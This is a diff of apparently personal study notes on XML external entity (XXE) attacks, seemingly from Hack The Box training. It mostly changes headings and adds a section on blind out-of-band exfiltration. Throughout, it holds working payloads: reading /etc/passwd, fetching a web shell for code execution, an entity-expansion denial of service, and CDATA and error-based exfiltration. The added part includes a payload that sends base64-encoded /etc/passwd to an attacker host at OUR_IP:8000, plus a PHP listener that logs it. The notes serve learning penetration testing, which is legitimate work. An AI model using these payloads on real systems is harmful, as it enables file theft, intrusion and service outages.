@@ -6,14 +6,14 @@
 ]>
 ```
 
-# Reading Sensitive Files
+## Reading Sensitive Files
 ```
 <!DOCTYPE email [
   <!ENTITY company SYSTEM "file:///etc/passwd">
 ]>
 ```
 
-# XXE TO RCE
+## XXE TO RCE
 
 The most efficient method to turn XXE into RCE is by fetching a web shell from our server and writing it to the web app, and then we can interact with it to execute commands. To do so, we can start by writing a basic PHP web shell and starting a python web server, as follows:
 
@@ -39,7 +39,7 @@ powen@htb[/htb]$ sudo python3 -m http.server 80
 > The expect module is not enabled/installed by default on modern PHP servers, so this attack may not always work. This is why XXE is usually used to disclose sensitive local files and source code, which may reveal additional vulnerabilities or ways to gain code execution.
 
 
-# XXE DOS
+## XXE DOS
 ```
 <?xml version="1.0"?>
 <!DOCTYPE email [
@@ -66,7 +66,7 @@ This payload defines the a0 entity as DOS, references it in a1 multiple times, r
 and so on until the back-end server's memory runs out due to the self-reference loops. However, this attack no longer works with modern web servers (e.g., Apache),  
 as they protect against entity self-reference
 
-## HTB practice
+### HTB practice
 ```
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE email [
@@ -80,7 +80,7 @@ as they protect against entity self-reference
 ```
 
 
-# Advanced Exfiltration with CDATA
+## Advanced Exfiltration with CDATA
 
 ```
 <!DOCTYPE email [
@@ -122,7 +122,7 @@ Now, we can reference our external entity (xxe.dtd) and then print the &joined; 
 <email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
 ```
 
-# Error Based XXE
+## Error Based XXE
 
 First, we will host a DTD file that contains the following payload:
 
@@ -145,6 +145,47 @@ Now, we can call our external DTD script, and then reference the error entity, a
 
 
 
+# Blind Data Exfiltration
+
+## Out-of-band Data Exfiltration
+
+we can first use a parameter entity for the content of the file we are reading while utilizing PHP filter to base64 encode it. Then, we will create another external parameter entity and reference it to our IP, and place the file parameter value as part of the URL being requested over HTTP, as follows:
+```
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
+```
+
+
+```
+<?php
+if(isset($_GET['content'])){
+    error_log("\n\n" . base64_decode($_GET['content']));
+}
+?>
+```
+```
+powen@htb[/htb]$ vi index.php # here we write the above PHP code
+powen@htb[/htb]$ php -S 0.0.0.0:8000
+```
+
+Now, to initiate our attack, we can use a similar payload to the one we used in the error-based attack, and simply add <root>&content;</root>, which is needed to reference our entity and have it send the request to our machine with the file content:
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [ 
+  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
+  %remote;
+  %oob;
+]>
+<root>&content;</root>
+```
+
+> In addition to storing our base64 encoded data as a parameter to our URL, we may utilize DNS OOB Exfiltration by placing the encoded data as a sub-domain for our URL (e.g. ENCODEDTEXT.our.website.com), and then use a tool like tcpdump to capture any incoming traffic and decode the sub-domain string to get the data. Granted, this method is more advanced and requires more effort to exfiltrate data through.
+
+
+## Automated OOB Exfiltration
+
+### XXEinjector
+https://github.com/enjoiz/XXEinjector
 
 ---
 
